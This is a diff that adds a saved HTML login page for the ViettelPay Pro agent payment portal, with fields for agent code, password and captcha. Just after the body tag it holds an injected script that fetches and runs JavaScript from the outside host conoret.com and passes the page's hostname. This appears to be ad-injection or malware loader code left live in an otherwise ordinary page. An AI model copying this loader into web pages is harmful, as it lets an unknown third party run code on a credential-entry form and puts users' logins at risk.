@@ -1,0 +1,69 @@
+<html xmlns="http://www.w3.org/1999/xhtml"><head id="j_idt2"><link type="text/css" rel="stylesheet" href="/faces/javax.faces.resource/theme.css?ln=primefaces-aristo"><script type="text/javascript" src="/faces/javax.faces.resource/jquery/jquery.js?ln=primefaces&amp;v=6.2"></script><script type="text/javascript" src="/faces/javax.faces.resource/jquery/jquery-plugins.js?ln=primefaces&amp;v=6.2"></script><script type="text/javascript" src="/faces/javax.faces.resource/core.js?ln=primefaces&amp;v=6.2"></script><link type="text/css" rel="stylesheet" href="/faces/javax.faces.resource/components.css?ln=primefaces&amp;v=6.2"><script type="text/javascript" src="/faces/javax.faces.resource/components.js?ln=primefaces&amp;v=6.2"></script><script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='vi';PrimeFaces.settings.projectStage='Development';}</script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <title>ViettelPay Pro - Đăng Nhập</title>
+        <link href="Content/css/Custom.css" rel="stylesheet" type="text/css">
+        <link href="Content/css/bootstrap.min.css" rel="stylesheet" type="text/css"></head><body class="body-cust font-size-cust"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+<form id="loginForm" name="loginForm" method="post" action="/faces/login.xhtml" enctype="application/x-www-form-urlencoded">
+<input type="hidden" name="loginForm" value="loginForm">
+<div id="loginForm:j_idt5"></div><div id="loginForm:j_idt6" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-shadow ui-hidden-container" role="dialog" aria-labelledby="loginForm:j_idt6_title" aria-hidden="true" style="width: auto; height: auto; visibility: visible; left: 61.1095px; top: 313.258px; z-index: 1001; display: none;" aria-live="off"><div class="ui-dialog-content ui-widget-content" style="height: auto;">
+                <img id="profile-img" src="Content/img/ajaxloadingbar.gif"></div></div><div id="loginForm:accountPanel" class="ui-outputpanel ui-widget">
+                <div class="form-signin mt-5">
+                    <div class="text-center pb-4 mt-3">
+                        <img id="profile-img" class="w-35" src="Content/img/logo-VTP.png">
+                    </div>
+
+                    <div class="mb-3 text-center font-size-cust"><div id="loginForm:msgError" class="ui-messages ui-widget" aria-live="polite"></div>
+                    </div><span id="loginForm:focusID"></span><script type="text/javascript">$(function(){PrimeFaces.focus('loginForm:userName');});</script>
+
+                    <div class="mb-3"><input id="loginForm:userName" name="loginForm:userName" type="text" maxlength="50" placeholder="Mã Đại lý / Điểm bán" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all form-control font-size-cust none-p" role="textbox" aria-disabled="false" aria-readonly="false">
+                    </div>
+
+                    <div class="mb-3"><input id="loginForm:password" name="loginForm:password" type="password" maxlength="6" placeholder="Mật khẩu Bankplus - BCCS" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all form-control font-size-cust none-p" role="textbox" aria-disabled="false" aria-readonly="false">
+                    </div>
+                        <div class="mb-3">
+                            <div class="row">
+                                <div class="col-6"><input id="loginForm:securityCode" name="loginForm:securityCode" type="text" maxlength="6" placeholder="Mã bảo vệ" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all form-control font-size-cust none-p ui-state-hover" role="textbox" aria-disabled="false" aria-readonly="false">
+                                </div>
+                                <!-- /.col -->
+                                <div class="col-6">
+                                    <img src="/captcha.png?0.6340087010873477" id="imgCaptcha" onclick="reloadCaptcha();" style="cursor: pointer;">
+                                </div>
+                                <!-- /.col -->
+                            </div>
+                        </div>
+
+                    <div><div id="loginForm:chkSaveInfo" class="ui-selectbooleancheckbox ui-chkbox ui-widget align-middle"><div class="ui-helper-hidden-accessible"><input id="loginForm:chkSaveInfo_input" name="loginForm:chkSaveInfo_input" type="checkbox" autocomplete="off" aria-hidden="true" aria-checked="false"></div><div class="ui-chkbox-box ui-widget ui-corner-all ui-state-default"><span class="ui-chkbox-icon ui-icon ui-icon-blank ui-c"></span></div></div><span class="font-size-cust ml-1">Ghi nhớ mã đại lý / Điểm bán này</span>
+                    </div>
+
+                    <div class="opt-note">
+                    </div>
+
+                    <div class="font-size-cust mt-2">
+                    </div>
+                </div></div><div id="loginForm:confirmPanel" class="ui-outputpanel ui-widget">
+                <!--&#272;&#259;ng Nh&#7853;p-->
+                <div class="btn-signin mt-3"><button id="loginForm:btnLogin" name="loginForm:btnLogin" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only btn-submit-login" onclick="PrimeFaces.ab({s:&quot;loginForm:btnLogin&quot;,u:&quot;@([id$=msgError]) @([id$=accountPanel]) @([id$=confirmPanel]) @([id$=focusID])&quot;,onco:function(xhr,status,args){reloadCaptcha();}});return false;" type="submit" role="button" aria-disabled="false"><span class="ui-button-text ui-c">ĐĂNG NHẬP</span></button>
+                </div>
+                <!-- X&aacute;c Nh&#7853;n-->
+                <div class="btn-signin mt-3">
+                </div>
+                <!--Nh&#7853;p L&#7841;i-->
+                <div class="btn-signin mt-3">
+                </div></div>  
+            <div class="login-foot">
+<!--                &lt;div class="text-center"&gt;-->
+<!--                    &lt;a href="/resetpassword.jsf"&gt;C&#7845;p l&#7841;i m&#7853;t kh&#7849;u&lt;/a&gt;-->
+<!--                &lt;/div&gt;-->
+                <div class="text-center">
+                    @ 2018 Viettel Telecom. Hotline: 1789 - Nhánh 5
+                </div>
+            </div><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="3698969233362539352:6311146008531437336" autocomplete="off">
+</form>
+        <script>
+            function reloadCaptcha() {
+                var url = '/captcha.png?' + Math.random();
+                $('#imgCaptcha').attr('src', url);
+            }
+        </script>
+<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div><div class="ui-dialog-docking-zone"></div></body></html>
